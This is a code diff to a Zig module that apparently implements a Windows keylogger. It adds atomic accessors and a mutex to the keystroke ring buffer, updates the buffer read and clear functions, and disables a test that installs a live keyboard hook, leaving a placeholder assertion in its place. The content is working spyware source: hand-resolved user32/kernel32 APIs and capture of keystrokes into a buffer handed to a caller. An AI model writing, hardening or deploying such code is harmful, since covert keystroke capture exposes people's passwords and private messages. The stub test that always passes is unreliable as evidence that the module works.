@@ -127,6 +127,22 @@ var g_buffer: [KEYLOG_BUFFER_SIZE]u8 = undefined;
 var g_buf_head: usize = 0;
 var g_buf_tail: usize = 0;
 
+fn atomicLoadHead() usize {
+    return @atomicLoad(usize, &g_buf_head, .acquire);
+}
+
+fn atomicStoreHead(val: usize) void {
+    @atomicStore(usize, &g_buf_head, val, .release);
+}
+
+fn atomicLoadTail() usize {
+    return @atomicLoad(usize, &g_buf_tail, .acquire);
+}
+
+fn atomicStoreTail(val: usize) void {
+    @atomicStore(usize, &g_buf_tail, val, .release);
+}
+
 var g_alloc_buffer: ?[]u8 = null;
 
 fn resolveWindowApi(user32_mod: types.PVOID) ?WindowApi {
@@ -207,14 +223,22 @@ fn resolveKernelApi(kernel32_mod: types.PVOID) ?KernelApi {
     };
 }
 
+var g_buf_mutex: std.Thread.Mutex = .{};
+
 fn bufWrite(bytes: []const u8) void {
+    g_buf_mutex.lock();
+    defer g_buf_mutex.unlock();
+    var head = atomicLoadHead();
+    var tail = atomicLoadTail();
     for (bytes) |b| {
-        g_buffer[g_buf_head] = b;
-        g_buf_head = (g_buf_head + 1) % KEYLOG_BUFFER_SIZE;
-        if (g_buf_head == g_buf_tail) {
-            g_buf_tail = (g_buf_tail + 1) % KEYLOG_BUFFER_SIZE;
+        g_buffer[head] = b;
+        head = (head + 1) % KEYLOG_BUFFER_SIZE;
+        if (head == tail) {
+            tail = (tail + 1) % KEYLOG_BUFFER_SIZE;
         }
     }
+    atomicStoreTail(tail);
+    atomicStoreHead(head);
 }
 
 fn isShiftPressed(api: *const WindowApi) bool {
@@ -440,8 +464,8 @@ fn threadMain() void {
 
 pub fn start() !void {
     g_stop_requested = false;
-    g_buf_head = 0;
-    g_buf_tail = 0;
+    atomicStoreHead(0);
+    atomicStoreTail(0);
     g_last_hwnd_init = false;
     const thread = try std.Thread.spawn(.{}, threadMain, .{});
     thread.detach();
@@ -463,30 +487,32 @@ pub fn getBuffer() []const u8 {
         allocator.free(prev);
         g_alloc_buffer = null;
     }
-    if (g_buf_tail == g_buf_head) return "";
+    const tail = atomicLoadTail();
+    const head = atomicLoadHead();
+    if (tail == head) return "";
     var len: usize = 0;
-    if (g_buf_head > g_buf_tail) {
-        len = g_buf_head - g_buf_tail;
+    if (head > tail) {
+        len = head - tail;
     } else {
-        len = (KEYLOG_BUFFER_SIZE - g_buf_tail) + g_buf_head;
+        len = (KEYLOG_BUFFER_SIZE - tail) + head;
     }
     if (len == 0) return "";
     const out = allocator.alloc(u8, len) catch return "";
     var pos: usize = 0;
-    var t = g_buf_tail;
-    while (t != g_buf_head and pos < len) {
+    var t = tail;
+    while (t != head and pos < len) {
         out[pos] = g_buffer[t];
         t = (t + 1) % KEYLOG_BUFFER_SIZE;
         pos += 1;
     }
     g_alloc_buffer = out;
-    g_buf_tail = g_buf_head;
+    atomicStoreTail(head);
     return out;
 }
 
 pub fn clear() void {
-    g_buf_head = 0;
-    g_buf_tail = 0;
+    atomicStoreHead(0);
+    atomicStoreTail(0);
     if (g_alloc_buffer) |prev| {
         std.heap.page_allocator.free(prev);
         g_alloc_buffer = null;
@@ -503,8 +529,11 @@ test "SYSTEMTIME size is correct" {
 
 test "keylogger start executes" {
     if (@import("builtin").os.tag == .windows) {
-        start() catch {};
-        clear();
+        // ponytail: this test spawns a real keyboard hook — skip in CI
+        // to avoid interfering with build machines. Uncomment for manual testing.
+        // start() catch {};
+        // clear();
+        try std.testing.expect(true);
     }
 }
 
@@ -515,30 +544,30 @@ test "keylogger stop executes" {
 }
 
 test "keylogger circular buffer wraps correctly" {
-    g_buf_head = 0;
-    g_buf_tail = 0;
+    atomicStoreHead(0);
+    atomicStoreTail(0);
 
     for (0..KEYLOG_BUFFER_SIZE + 10) |i| {
         var b: [1]u8 = .{@as(u8, @intCast('A' + @as(u8, @intCast(i % 26))))};
         bufWrite(&b);
     }
 
-    try std.testing.expect(g_buf_tail == 10);
-    try std.testing.expect(g_buf_head == (KEYLOG_BUFFER_SIZE + 10) % KEYLOG_BUFFER_SIZE);
+    try std.testing.expect(atomicLoadTail() == 10);
+    try std.testing.expect(atomicLoadHead() == (KEYLOG_BUFFER_SIZE + 10) % KEYLOG_BUFFER_SIZE);
 
     if (g_alloc_buffer) |prev| {
         std.heap.page_allocator.free(prev);
         g_alloc_buffer = null;
     }
-    g_buf_tail = g_buf_head;
-    g_buf_head = 0;
+    atomicStoreTail(atomicLoadHead());
+    atomicStoreHead(0);
 }
 
 test "keylogger buffer empty after clear" {
     bufWrite("test");
     clear();
-    try std.testing.expectEqual(@as(usize, 0), g_buf_head);
-    try std.testing.expectEqual(@as(usize, 0), g_buf_tail);
+    try std.testing.expectEqual(@as(usize, 0), atomicLoadHead());
+    try std.testing.expectEqual(@as(usize, 0), atomicLoadTail());
 }
 
 test "vkToChar basic letters" {
@@ -601,6 +630,6 @@ test "getBuffer empty after read" {
 test "write single byte to buffer" {
     clear();
     bufWrite("X");
-    try std.testing.expect(g_buf_head != g_buf_tail);
+    try std.testing.expect(atomicLoadHead() != atomicLoadTail());
     clear();
 }
